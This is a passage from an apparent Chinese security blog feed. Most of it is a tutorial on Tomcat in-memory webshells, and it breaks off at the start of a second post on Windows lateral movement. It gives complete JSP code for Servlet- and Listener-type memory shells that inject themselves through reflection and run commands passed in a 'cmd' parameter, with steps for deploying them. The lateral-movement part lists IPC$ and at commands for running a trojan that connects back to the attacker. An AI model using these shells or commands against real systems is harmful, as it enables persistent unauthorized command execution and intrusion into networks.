class="headerlink" title="02 踩坑"></a>02 踩坑</h3><p>使用IDEA复制完整内存马时，需要导入库都无法导入，显示不存在。简单的解决方法：复制tomcat目录下的lib文件夹中的<strong>全部jar包</strong>（因为不知道具体方法躲在哪个jar包中）至项目目录中，然后右键选择 ”add as libraries“导入到项目即可：</p><p><img src="/2021/07/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/3.png" alt></p><h2 id="0x01-Servlet型内存马"><a href="#0x01-Servlet型内存马" class="headerlink" title="0x01  Servlet型内存马"></a>0x01  Servlet型内存马</h2><h3 id="00-原理-1"><a href="#00-原理-1" class="headerlink" title="00 原理"></a>00 原理</h3><p>类比filter，在filter型中我们需要在<strong>doFilter方法中填入恶意代码</strong>；在servlet中，我们需要在<strong>service方法中填入恶意代码</strong>，每次访问就会触发命令执行。在service填入RuntimeExec和回显的部分，这个<strong>servlet就变成了进行命令执行的木马</strong></p><h3 id="01-实现-1"><a href="#01-实现-1" class="headerlink" title="01 实现"></a>01 实现</h3><h4 id="Servlet部分"><a href="#Servlet部分" class="headerlink" title="Servlet部分"></a>Servlet部分</h4><p>首先看一个简单的servlet的结构： </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServletDemo</span> <span class="keyword">implements</span> <span class="title">Servlet</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//当Servlet第一次被创建对象时执行该方法,该方法在整个生命周期中只执行一次</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig arg0)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"init"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//对客户端响应的方法,该方法会被执行多次，每次请求该servlet都会执行该方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"service"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//当Servlet被销毁时执行该方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"destroy"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//当停止tomcat时销毁servlet。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ServletConfig <span class="title">getServletConfig</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getServletInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Servlet型内存马实现之Servlet部分，在service方法填入RuntimeExec和回显的部分，触发命令执行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ServletDemo</span> <span class="keyword">implements</span> <span class="title">Servlet</span></span>&#123;   </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException </span>&#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getServletInfo</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;&#125;    <span class="function"><span class="keyword">public</span> ServletConfig <span class="title">getServletConfig</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String cmd = servletRequest.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line">                    <span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">            StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                stringBuilder.append(line + <span class="string">'\n'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">            servletResponse.getOutputStream().flush();</span><br><span class="line">            servletResponse.getOutputStream().close();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="动态注册部分-1"><a href="#动态注册部分-1" class="headerlink" title="动态注册部分"></a>动态注册部分</h4><p>获取context部分与filter中相同,仍然从org.apache.catalina.core.ApplicationContext反射获取：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">Field appctx = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure><p> 然后这次需要将上文写的servlet封装成wrapper再使用context添加：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将恶意servlet封装成wrapper添加到StandardContext的children当中</span></span><br><span class="line">ServletDemo demo = <span class="keyword">new</span> ServletDemo();</span><br><span class="line">org.apache.catalina.Wrapper demoWrapper = standardContext.createWrapper();</span><br><span class="line">demoWrapper.setName(<span class="string">"xyz"</span>);</span><br><span class="line">demoWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">demoWrapper.setServlet(demo);</span><br><span class="line">demoWrapper.setServletClass(demo.getClass().getName());</span><br><span class="line">standardContext.addChild(demoWrapper);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置ServletMap将访问的URL和wrapper进行绑定</span></span><br><span class="line">standardContext.addServletMapping(<span class="string">"/xyz"</span>, <span class="string">"xyz"</span>);</span><br><span class="line">out.println(<span class="string">"inject servlet success!"</span>);</span><br></pre></td></tr></table></figure><p> servlet型的内存马无法使所有请求都经过恶意代码，只有访问我们设定的url才能触发 </p><h4 id="完整Servlet内存马"><a href="#完整Servlet内存马" class="headerlink" title="完整Servlet内存马"></a>完整Servlet内存马</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.core.ApplicationContext"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"org.apache.catalina.core.StandardContext"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"javax.servlet.*"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"java.io.IOException"</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span> = <span class="string">"java.lang.reflect.Field"</span>%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ServletDemo</span> <span class="keyword">implements</span> <span class="title">Servlet</span></span>&#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException </span>&#123;&#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">getServletInfo</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;&#125;    <span class="function"><span class="keyword">public</span> ServletConfig <span class="title">getServletConfig</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">            String cmd = servletRequest.getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">                java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line">                        <span class="keyword">new</span> java.io.InputStreamReader(process.getInputStream()));</span><br><span class="line">                StringBuilder stringBuilder = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    stringBuilder.append(line + <span class="string">'\n'</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());</span><br><span class="line">                servletResponse.getOutputStream().flush();</span><br><span class="line">                servletResponse.getOutputStream().close();</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">    appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">    ServletDemo demo = <span class="keyword">new</span> ServletDemo();</span><br><span class="line">    org.apache.catalina.Wrapper demoWrapper = standardContext.createWrapper();</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置Servlet名等</span></span><br><span class="line">    demoWrapper.setName(<span class="string">"xyz"</span>);</span><br><span class="line">    demoWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    demoWrapper.setServlet(demo);</span><br><span class="line">    demoWrapper.setServletClass(demo.getClass().getName());</span><br><span class="line">    standardContext.addChild(demoWrapper);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置ServletMap</span></span><br><span class="line">    standardContext.addServletMapping(<span class="string">"/xyz"</span>, <span class="string">"xyz"</span>);</span><br><span class="line"><span class="comment">//standardContext.addServletMappingDecoded("/xyz", "xyz");</span></span><br><span class="line">    out.println(<span class="string">"inject servlet success!"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>使用方法同上，最终jsp文件将其命名为2.jsp，然后只需<strong>传到web目录并访问一次jsp文件，然后再将/2.jsp换成/xyz?cmd=whoami</strong>访问即可：</p><p><img src="/2021/07/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/4.png" alt></p><p>提示注入成功，访问路径触发命令执行：</p><p><img src="/2021/07/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/5.png" alt></p><h3 id="02踩坑"><a href="#02踩坑" class="headerlink" title="02踩坑"></a>02踩坑</h3><p>我用的是Tomcat9环境，使用上面的“standardContext.addServletMapping(“/xyz”, “xyz”);”语句会报错，得用下面的Decoded的方法“standardContext.addServletMappingDecoded(“/xyz”, “xyz”);”，才能执行成功：</p><p><img src="/2021/07/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/7.png" alt></p><h2 id="0x02-Listener型内存马"><a href="#0x02-Listener型内存马" class="headerlink" title="0x02 Listener型内存马"></a>0x02 Listener型内存马</h2><h3 id="00-实现"><a href="#00-实现" class="headerlink" title="00 实现"></a>00 实现</h3><h4 id="Listener部分"><a href="#Listener部分" class="headerlink" title="Listener部分"></a>Listener部分</h4><p>普通Listener结构：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span> <span class="keyword">implements</span> <span class="title">ServletRequestListener</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Initialized."</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Destroyed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 在Listener中，我们需要在<strong>初始化操作contextInitialized中填入恶意代码</strong>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span> <span class="keyword">implements</span> <span class="title">ServletRequestListener</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class="line">        String cmd = servletRequestEvent.getServletRequest().getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">        <span class="keyword">if</span>(cmd != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="完整Listener型内存马"><a href="#完整Listener型内存马" class="headerlink" title="完整Listener型内存马"></a>完整Listener型内存马</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.ApplicationContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"org.apache.catalina.core.StandardContext"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.servlet.*"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.servlet.annotation.WebServlet"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.servlet.http.HttpServlet"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.servlet.http.HttpServletRequest"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.servlet.http.HttpServletResponse"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.io.IOException"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"java.lang.reflect.Field"</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span> <span class="keyword">implements</span> <span class="title">ServletRequestListener</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> </span>&#123;</span><br><span class="line">        String cmd = servletRequestEvent.getServletRequest().getParameter(<span class="string">"cmd"</span>);</span><br><span class="line">        <span class="keyword">if</span>(cmd != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">ServletContext servletContext =  request.getSession().getServletContext();</span><br><span class="line">Field appctx = servletContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">S servletRequestListener = <span class="keyword">new</span> S();</span><br><span class="line">standardContext.addApplicationEventListener(servletRequestListener);</span><br><span class="line">out.println(<span class="string">"inject success"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>最终jsp文件将其命名为3.jsp，然后只需<strong>传到web目录并访问一次jsp文件，然后再将/3.jsp换成/?cmd=whoami</strong>访问即可：</p><p><img src="/2021/07/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/6.png" alt></p><p>注入成功后，访问路径触发：</p><p><img src="/2021/07/11/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/8.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Tomcat内存马&quot;&gt;&lt;a href=&quot;#Tomcat内存马&quot; class=&quot;headerlink&quot; title=&quot;Tomcat内存马&quot;&gt;&lt;/a&gt;Tomcat内存马&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;filter型&lt;/li&gt;
&lt;li&gt;servlet型&lt;/li&gt;
&lt;li&gt;l
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bai-ren-1.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>横向移动</title>
    <link href="http://bai-ren-1.github.io/2021/07/07/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/"/>
    <id>http://bai-ren-1.github.io/2021/07/07/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</id>
    <published>2021-07-07T09:13:16.000Z</published>
    <updated>2021-07-08T07:18:56.194Z</updated>
    
    <content type="html"><![CDATA[<h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><p>记录总结。抄自：<a href="https://mp.weixin.qq.com/s/-SNNLXB_iz8tUmRKMLr6nw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/-SNNLXB_iz8tUmRKMLr6nw</a></p><h2 id="0x00-IPC连接"><a href="#0x00-IPC连接" class="headerlink" title="0x00 IPC连接"></a>0x00 IPC连接</h2><blockquote><p> IPC$(Internet Process Connection) 是为了让进程之间通信的一种“管道”，通过提供用户名密码建立了一条安全的、加密的、用于数据交换的通道。两个IP之间只能建立一个IPC$连接。 通过这个连接，可以实现在被连接的目标机器上搞文件上传、下载、命令执行 。</p></blockquote><h3 id="00-IPC-计划任务"><a href="#00-IPC-计划任务" class="headerlink" title="00 IPC$+计划任务"></a>00 IPC$+计划任务</h3><p>使用IPC$配合计划任务实现横向移动的<strong>大体思路</strong>如下：</p><ul><li>首先建立向目标主机的<code>IPC$</code>连接。</li><li>其次把命令执行的脚本传到目标主机。</li><li>再次创建计划任务在目标机器上执行命令脚本。</li><li>最后过河拆桥删除<code>IPC$</code>连接。</li></ul><p>使用IPC$配合计划任务实现横向移动的<strong>利用条件</strong>如下：</p><ul><li>目标机器没有禁用<code>IPC$</code>连接，没有什么防火防盗拦截<code>IPC$</code>，139 445 端口也开了（能走445走445，不能则走139</li><li>目标机器小管理员开了<code>IPC$</code>默认共享服务（逻辑盘、系统目录；都不开我访问个啥？）</li><li>获取了目标机器的<strong>小管理员的管理员权限的账号密码</strong>（最好是域管理员账号密码），明文的</li><li>目标系统能支持<code>IPC$</code>，且和攻击机能彼此互通（废话）</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用本地命令copy或者用CS beacon的upload，把自己写的或者是工具生成的木马搞到目标机器上。接下来创建windows计划任务，自动执行木马反弹连接到攻击机器。自动执行木马操作在windows中最常用的就是计划任务at和schtasks。</span><br></pre></td></tr></table></figure><h4 id="001-IPC-命令"><a href="#001-IPC-命令" class="headerlink" title="001 IPC$命令"></a>001 IPC$命令</h4><p>建立IPC连接并查看：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\&lt;IP&gt;\ipc$ password /user:username //建立IPC连接</span><br><span class="line"><span class="built_in">net</span> use //查看当前主机所建立的连接</span><br></pre></td></tr></table></figure><p>ipc连接还有一个常用的命令就是进行本地映射，如果在命令行里面查看目录觉得很麻烦的话可以使用如下命令将已经建立IPC连接的主机的任意盘符映射到自己的本地：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dir</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">138</span>\c$ //列举目标盘符目录</span><br><span class="line"><span class="built_in">net</span> use z: \\ip\c$ password /user:Administrator //把目标C盘映射到本地z盘(未建立ipc连接的情况下)</span><br><span class="line"><span class="built_in">net</span> use z: \\ip\c$ //把目标C盘映射到本地z盘(已建立ipc连接的情况下)</span><br></pre></td></tr></table></figure><p>删除IPC连接：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\ip\ipc$</span><br></pre></td></tr></table></figure><h4 id="002-at命令实现计划任务"><a href="#002-at命令实现计划任务" class="headerlink" title="002 at命令实现计划任务"></a>002 at命令实现计划任务</h4><blockquote><p>at 命令是Windows自带的用于创建计划任务的命令，但是at 命令只在2003及以下的版本使用。我们可以通过at命令通过跳板机在目标主机DC上创建计划任务，让计算机在指定的时间执行木马程序，从而获得对内网目标主机的控制。 </p></blockquote><p>at命令在内网中的利用方法：</p><p>在获取webshell后不能够执行系统命令的情况下可以用<strong>at命令将命令执行后写入txt再用type读取</strong>：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">at</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">52</span>.<span class="number">141</span> <span class="number">16</span>:<span class="number">40</span>:<span class="number">00</span> <span class="built_in">cmd</span>.exe /c " whoami(等命令) &gt; c:\result.txt"</span><br><span class="line"><span class="built_in">type</span> \\<span 